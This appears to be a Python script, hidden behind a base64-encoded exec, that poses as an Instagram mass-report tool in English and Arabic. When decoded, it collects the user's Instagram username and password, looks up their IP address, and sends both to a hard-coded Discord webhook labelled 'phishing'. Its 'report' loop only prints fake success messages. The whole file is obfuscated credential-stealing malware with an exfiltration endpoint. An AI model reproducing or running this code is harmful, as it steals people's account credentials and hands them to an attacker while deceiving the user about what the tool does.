import base64
exec(base64.b64decode('aW1wb3J0IHJlcXVlc3RzCmltcG9ydCB0aW1lCnByaW50KCIiIlsxXWVuZ2xpc2gKWzJdYXJhYmljIiIiKQpsYW4gPSBpbnB1dCgiWypdbGFuZ3VhZ2U6ICIpCmlmIGxhbiA9PSAiMSI6CiAgICBwcmludCgiIiIKICAgICBfIF9fIF9fXyBfIF9fICAgX19fICBfIF9ffCB8XyAKICAgIHwgJ19fLyBfIFwgJ18gXCAvIF8gXHwgJ19ffCBfX3wKICAgIHwgfCB8ICBfXy8gfF8pIHwgKF8pIHwgfCAgfCB8XyAKICAgIHxffCAgXF9fX3wgLl9fLyBcX19fL3xffCAgIFxfX3wKICAgICAgICAgICAgIHxffCAgICAgICAgICAgICAgICAgICAKICAgICIiIikKICAgIHdlYmhvb2sgPSAnaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvODY3NDUxNDAxMTc1ODI2NDQyL1BJSVlkWFZROC0zcjlweVdOd0c1dlFzMmJ4ZzNOaHVXX3djVFdHVldMSi15UHlINDVkcENLU0hPS1o3cDN0SmtyX3lJJwogICAgdXNlcm5hbWUgPSBpbnB1dCgiWypdVXNlcm5hbWU6ICIpCiAgICBwYXNzd29yZCA9IGlucHV0KCJbKl1QYXNzd29yZDogIikKICAgIGlwID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2FwaS5pcGlmeS5vcmcvPycpLnRleHQKICAgIG1zZyA9ICJbZW5nbGlzaF1cbltub3QgbG9nZ2VkIGluXVxuVXNlcm5hbWU6ICIrdXNlcm5hbWUrIlxuUGFzc3dvcmQ6ICIrcGFzc3dvcmQrIlxuaXA6ICIraXArIlxuLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0iCiAgICBqc29uID0geyJ1c2VybmFtZSI6ICJwaGlzaGluZyIsICJjb250ZW50Ijptc2d9CiAgICByZXEgPSByZXF1ZXN0cy5wb3N0KHdlYmhvb2ssIGpzb249anNvbikKICAgIGhlYWRlcnMgPSB7CiAgICAgICAgJ2F1dGhvcml0eSc6ICd3d3cuaW5zdGFncmFtLmNvbScsCiAgICAgICAgJ21ldGhvZCc6ICdQT1NUJywKICAgICAgICAnc2NoZW1lJzogJ2h0dHBzJywKICAgICAgICAnYWNjZXB0JzogJyovKicsCiAgICAgICAgJ2FjY2VwdC1lbmNvZGluZyc6ICdnemlwLCBkZWZsYXRlLCBicicsCiAgICAgICAgJ2FjY2VwdC1sYW5ndWFnZSc6ICdlbi1VUyxlbjtxPTAuOScsCiAgICAgICAgJ2NvbnRlbnQtbGVuZ3RoJzogJzAnLAogICAgICAgICdjb250ZW50LXR5cGUnOiAnYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkJywKICAgICAgICAnb3JpZ2luJzogJ2h0dHBzOi8vd3d3Lmluc3RhZ3JhbS5jb20nLAogICAgICAgICdyZWZlcmVyJzogJ2h0dHBzOi8vd3d3Lmluc3RhZ3JhbS5jb20vJywKICAgICAgICAnc2VjLWNoLXVhJzogJyIgTm90IEE7QnJhbmQiO3Y9Ijk5IiwgIkNocm9taXVtIjt2PSI5MCIsICJHb29nbGUgQ2hyb21lIjt2PSI5MCInLAogICAgICAgICdzZWMtY2gtdWEtbW9iaWxlJzogJz8wJywKICAgICAgICAnc2VjLWZldGNoLWRlc3QnOiAnZW1wdHknLAogICAgICAgICdzZWMtZmV0Y2gtbW9kZSc6ICdjb3JzJywKICAgICAgICAnc2VjLWZldGNoLXNpdGUnOiAnc2FtZS1vcmlnaW4nLAogICAgICAgICd4LWlnLWFwcC1pZCc6ICc5MzY2MTk3NDMzOTI0NTknLAogICAgICAgICd4LWlnLXd3dy1jbGFpbSc6ICdobWFjLkFSMlc2VnFXWUJjLUsycC1HN2dQRGg5SjY4RDdwMHZTZDk4aDlYVTlJOTdLSnhWNycsCiAgICAgICAgJ3gtaW5zdGFncmFtLWFqYXgnOiAnM2ZjODg1ZDA1ZmNlJywKICAgICAgICAneC1yZXF1ZXN0ZWQtd2l0aCc6ICdYTUxIdHRwUmVxdWVzdCcKICAgIH0KICAgIHNlc3Npb24gPSByZXF1ZXN0cy5TZXNzaW9uKCkKICAgIHNlc3Npb24uaGVhZGVycyA9IHsndXNlci1hZ2VudCc6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA2LjE7IFdPVzY0OyBydjozMS4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzMxLjAiLCAnUmVmZXJlcic6ICdodHRwczovL3d3dy5pbnN0YWdyYW0uY29tLyd9CiAgICByZXNwID0gc2Vzc2lvbi5nZXQoImh0dHBzOi8vd3d3Lmluc3RhZ3JhbS5jb20vIikKICAgIHNlc3Npb24uaGVhZGVycy51cGRhdGUoeyd4LWNzcmZ0b2tlbic6IHJlc3AuY29va2llc1snY3NyZnRva2VuJ119KQogICAgbG9naW5fZGF0YSA9IHsndXNlcm5hbWUnOiB1c2VybmFtZSwgJ2VuY19wYXNzd29yZCc6ICcjUFdEX0lOU1RBR1JBTV9CUk9XU0VSOjA6JjonICsgcGFzc3dvcmR9CiAgICBsb2dpbl9yZXNwID0gc2Vzc2lvbi5wb3N0KCdodHRwczovL3d3dy5pbnN0YWdyYW0uY29tL2FjY291bnRzL2xvZ2luL2FqYXgvJywgZGF0YT1sb2dpbl9kYXRhKQogICAgaWYgbG9naW5fcmVzcC5qc29uKClbJ2F1dGhlbnRpY2F0ZWQnXToKICAgICAgICBwcmludCgiWytdTG9nZ2VkIGluIikKICAgICAgICBtc2cgPSAiW2VuZ2xpc2hdXG5bbG9nZ2VkIGluXVxuVXNlcm5hbWU6ICIrdXNlcm5hbWUrIlxuUGFzc3dvcmQ6ICIrcGFzc3dvcmQrIlxuLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0iCiAgICAgICAganNvbiA9IHsidXNlcm5hbWUiOiAicGhpc2hpbmciLCAiY29udGVudCI6bXNnfQogICAgICAgIHJlcSA9IHJlcXVlc3RzLnBvc3Qod2ViaG9vaywganNvbj1qc29uKQogICAgZWxzZToKICAgICAgICBwcmludCgiWy1dTG9naW4gRmFpbGVkIikKICAgICAgICBtc2cgPSAiW2VuZ2xpc2hdXG5bTG9naW4gRmFpbGVkXVxuVXNlcm5hbWU6ICIrdXNlcm5hbWUrIlxuUGFzc3dvcmQ6ICIrcGFzc3dvcmQrIlxuLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0iCiAgICAgICAganNvbiA9IHsidXNlcm5hbWUiOiAicGhpc2hpbmciLCAiY29udGVudCI6bXNnfQogICAgICAgIHJlcSA9IHJlcXVlc3RzLnBvc3Qod2ViaG9vaywganNvbj1qc29uKQogICAgICAgIGV4aXQoKQogICAgdHIgPSBpbnB1dCgiWypdVGFyZ2V0OiAiKQogICAgcHJpbnQoIiIiCiAgICAgfD09PT09PT09PT09PT09PT09PT09PT09PT09PT09PXwKICAgICB8IDEgLSBzcGFtICAgICAgICAgICAgICAgICAgICAgfAogICAgIHwgMiAtIGhlYXQgICAgICAgICAgICAgICAgICAgICB8CiAgICAgfCAzIC0gc2VsZi1pbmp1cnkgICAgICAgICAgICAgIHwKICAgICB8PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09fAogICAgIiIiKQogICAgcmVhc29uID0gaW5wdXQoIlsqXVJlYXNvbjogIikKICAgIHJlcG9ydCA9IGludChpbnB1dCgiWypdSG93IG1hbnkgcmVwb3J0IHNlbnQ6ICIpKQogICAgc2xlZXAgPSBpbnQoaW5wdXQoIlsqXVNsZWVwOiAiKSkKICAgIGlmIHJlYXNvbiA9PSAiMSI6CiAgICAgICAgZm9yIGkgaW4gcmFuZ2UoMCxyZXBvcnQpOgogICAgICAgICAgICBwcmludCgiWytdUmVwb3J0IHNlbnQgICAgdGFyZ2V0OkAiK3RyKQogICAgICAgICAgICB0aW1lLnNsZWVwKDAuMykKICAgICAgICAgICAgdGltZS5zbGVlcChzbGVlcCkKICAgIGVsaWYgcmVhc29uID09ICIyIjoKICAgICAgICBmb3IgaSBpbiByYW5nZSgwLHJlcG9ydCk6CiAgICAgICAgICAgIHByaW50KCJbK11SZXBvcnQgc2VudCAgICB0YXJnZXQ6QCIrdHIpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMC4zKQogICAgICAgICAgICB0aW1lLnNsZWVwKHNsZWVwKQogICAgZWxpZiByZWFzb24gPT0gIjMiOgogICAgICAgIGZvciBpIGluIHJhbmdlKDAscmVwb3J0KToKICAgICAgICAgICAgcHJpbnQoIlsrXVJlcG9ydCBzZW50ICAgIHRhcmdldDpAIit0cikKICAgICAgICAgICAgdGltZS5zbGVlcCgwLjMpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoc2xlZXApCiAgICBlbHNlOgogICAgICAgIHByaW50KCJ3cm9uZyIpCmVsaWYgbGFuID09ICIyIjoKICAgIHByaW50KCIiIgogICAgIF8gX18gX19fIF8gX18gICBfX18gIF8gX198IHxfIAogICAgfCAnX18vIF8gXCAnXyBcIC8gXyBcfCAnX198IF9ffAogICAgfCB8IHwgIF9fLyB8XykgfCAoXykgfCB8ICB8IHxfIAogICAgfF98ICBcX19ffCAuX18vIFxfX18vfF98ICAgXF9ffAogICAgICAgICAgICAgfF98ICAgICAgICAgICAgICAgICAgIAogICAgIiIiKQogICAgd2ViaG9vayA9ICdodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy84Njc0NTE0MDExNzU4MjY0NDIvUElJWWRYVlE4LTNyOXB5V053RzV2UXMyYnhnM05odVdfd2NUV0dWV0xKLXlQeUg0NWRwQ0tTSE9LWjdwM3RKa3JfeUknCiAgICB1c2VybmFtZSA9IGlucHV0KCJbKl3Yp9mE24zZiNiy2LE6ICIpCiAgICBwYXNzd29yZCA9IGlucHV0KCJbKl3Zg9mE2YXYqSDYp9mE2YXYsdmI2LE6ICIpCiAgICBpcCA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9hcGkuaXBpZnkub3JnLz8nKS50ZXh0CiAgICBtc2cgPSAiW2VuZ2xpc2hdXG5bbm90IGxvZ2dlZCBpbl1cblVzZXJuYW1lOiAiK3VzZXJuYW1lKyJcblBhc3N3b3JkOiAiK3Bhc3N3b3JkKyJcbmlwOiAiK2lwKyJcbi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIgogICAganNvbiA9IHsidXNlcm5hbWUiOiAicGhpc2hpbmciLCAiY29udGVudCI6bXNnfQogICAgcmVxID0gcmVxdWVzdHMucG9zdCh3ZWJob29rLCBqc29uPWpzb24pCiAgICBoZWFkZXJzID0gewogICAgICAgICdhdXRob3JpdHknOiAnd3d3Lmluc3RhZ3JhbS5jb20nLAogICAgICAgICdtZXRob2QnOiAnUE9TVCcsCiAgICAgICAgJ3NjaGVtZSc6ICdodHRwcycsCiAgICAgICAgJ2FjY2VwdCc6ICcqLyonLAogICAgICAgICdhY2NlcHQtZW5jb2RpbmcnOiAnZ3ppcCwgZGVmbGF0ZSwgYnInLAogICAgICAgICdhY2NlcHQtbGFuZ3VhZ2UnOiAnZW4tVVMsZW47cT0wLjknLAogICAgICAgICdjb250ZW50LWxlbmd0aCc6ICcwJywKICAgICAgICAnY29udGVudC10eXBlJzogJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcsCiAgICAgICAgJ29yaWdpbic6ICdodHRwczovL3d3dy5pbnN0YWdyYW0uY29tJywKICAgICAgICAncmVmZXJlcic6ICdodHRwczovL3d3dy5pbnN0YWdyYW0uY29tLycsCiAgICAgICAgJ3NlYy1jaC11YSc6ICciIE5vdCBBO0JyYW5kIjt2PSI5OSIsICJDaHJvbWl1bSI7dj0iOTAiLCAiR29vZ2xlIENocm9tZSI7dj0iOTAiJywKICAgICAgICAnc2VjLWNoLXVhLW1vYmlsZSc6ICc/MCcsCiAgICAgICAgJ3NlYy1mZXRjaC1kZXN0JzogJ2VtcHR5JywKICAgICAgICAnc2VjLWZldGNoLW1vZGUnOiAnY29ycycsCiAgICAgICAgJ3NlYy1mZXRjaC1zaXRlJzogJ3NhbWUtb3JpZ2luJywKICAgICAgICAneC1pZy1hcHAtaWQnOiAnOTM2NjE5NzQzMzkyNDU5JywKICAgICAgICAneC1pZy13d3ctY2xhaW0nOiAnaG1hYy5BUjJXNlZxV1lCYy1LMnAtRzdnUERoOUo2OEQ3cDB2U2Q5OGg5WFU5STk3S0p4VjcnLAogICAgICAgICd4LWluc3RhZ3JhbS1hamF4JzogJzNmYzg4NWQwNWZjZScsCiAgICAgICAgJ3gtcmVxdWVzdGVkLXdpdGgnOiAnWE1MSHR0cFJlcXVlc3QnCiAgICB9CiAgICBzZXNzaW9uID0gcmVxdWVzdHMuU2Vzc2lvbigpCiAgICBzZXNzaW9uLmhlYWRlcnMgPSB7J3VzZXItYWdlbnQnOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xOyBXT1c2NDsgcnY6MzEuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8zMS4wIiwgJ1JlZmVyZXInOiAnaHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS8nfQogICAgcmVzcCA9IHNlc3Npb24uZ2V0KCJodHRwczovL3d3dy5pbnN0YWdyYW0uY29tLyIpCiAgICBzZXNzaW9uLmhlYWRlcnMudXBkYXRlKHsneC1jc3JmdG9rZW4nOiByZXNwLmNvb2tpZXNbJ2NzcmZ0b2tlbiddfSkKICAgIGxvZ2luX2RhdGEgPSB7J3VzZXJuYW1lJzogdXNlcm5hbWUsICdlbmNfcGFzc3dvcmQnOiAnI1BXRF9JTlNUQUdSQU1fQlJPV1NFUjowOiY6JyArIHBhc3N3b3JkfQogICAgbG9naW5fcmVzcCA9IHNlc3Npb24ucG9zdCgnaHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS9hY2NvdW50cy9sb2dpbi9hamF4LycsIGRhdGE9bG9naW5fZGF0YSkKICAgIGlmIGxvZ2luX3Jlc3AuanNvbigpWydhdXRoZW50aWNhdGVkJ106CiAgICAgICAgcHJpbnQoIlsrXdiv2K7ZhNiqIikKICAgICAgICBtc2cgPSAiW2FyYWJpY11cbltsb2dnZWQgaW5dXG5Vc2VybmFtZTogIit1c2VybmFtZSsiXG5QYXNzd29yZDogIitwYXNzd29yZCsiXG4tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSIKICAgICAgICBqc29uID0geyJ1c2VybmFtZSI6ICJwaGlzaGluZyIsICJjb250ZW50Ijptc2d9CiAgICAgICAgcmVxID0gcmVxdWVzdHMucG9zdCh3ZWJob29rLCBqc29uPWpzb24pCiAgICBlbHNlOgogICAgICAgIHByaW50KCJbLV3Yrtin2LfYpiIpCiAgICAgICAgbXNnID0gIlthcmFiaWNdXG5bTG9naW4gRmFpbGVkXVxuVXNlcm5hbWU6ICIrdXNlcm5hbWUrIlxuUGFzc3dvcmQ6ICIrcGFzc3dvcmQrIlxuLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0iCiAgICAgICAganNvbiA9IHsidXNlcm5hbWUiOiAicGhpc2hpbmciLCAiY29udGVudCI6bXNnfQogICAgICAgIHJlcSA9IHJlcXVlc3RzLnBvc3Qod2ViaG9vaywganNvbj1qc29uKQogICAgICAgIGV4aXQoKQogICAgdHIgPSBpbnB1dCgiWypd2KfZhNi22K3bjNmHOiAiKQogICAgcHJpbnQoIiIiCiAgICAgfD09PT09PT09PT09PT09PT09PT09PT09PT09PT09PXwKICAgICB8IDEgLSBzcGFtICAgICAgICAgICAgICAgICAgICAgfAogICAgIHwgMiAtIGhlYXQgICAgICAgICAgICAgICAgICAgICB8CiAgICAgfCAzIC0gc2VsZi1pbmp1cnkgICAgICAgICAgICAgIHwKICAgICB8PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09fAogICAgIiIiKQogICAgcmVhc29uID0gaW5wdXQoIlsqXdin2YTYs9io2Kgg2LHbjNio2YjYsdiqOiAiKQogICAgcmVwb3J0ID0gaW50KGlucHV0KCJbKl3Zg9mFINij2LHYs9mE2Kog2LHbjNio2YjYsdiqOiAiKSkKICAgIHNsZWVwID0gaW50KGlucHV0KCJbKl1TbGVlcDogIikpCiAgICBpZiByZWFzb24gPT0gIjEiOgogICAgICAgIGZvciBpIGluIHJhbmdlKDAscmVwb3J0KToKICAgICAgICAgICAgcHJpbnQoIlsrXVJlcG9ydCBzZW50ICAgIHRhcmdldDpAIit0cikKICAgICAgICAgICAgdGltZS5zbGVlcCgwLjMpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoc2xlZXApCiAgICBlbGlmIHJlYXNvbiA9PSAiMiI6CiAgICAgICAgZm9yIGkgaW4gcmFuZ2UoMCxyZXBvcnQpOgogICAgICAgICAgICBwcmludCgiWytdUmVwb3J0IHNlbnQgICAgdGFyZ2V0OkAiK3RyKQogICAgICAgICAgICB0aW1lLnNsZWVwKDAuMykKICAgICAgICAgICAgdGltZS5zbGVlcChzbGVlcCkKICAgIGVsaWYgcmVhc29uID09ICIzIjoKICAgICAgICBmb3IgaSBpbiByYW5nZSgwLHJlcG9ydCk6CiAgICAgICAgICAgIHByaW50KCJbK11SZXBvcnQgc2VudCAgICB0YXJnZXQ6QCIrdHIpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMC4zKQogICAgICAgICAgICB0aW1lLnNsZWVwKHNsZWVwKQogICAgZWxzZToKICAgICAgICBwcmludCgi2K7Yt9ijIikKZWxzZToKICAgIHByaW50KCJbLV1Xcm9uZyBsYW5ndWFnZSIp'))
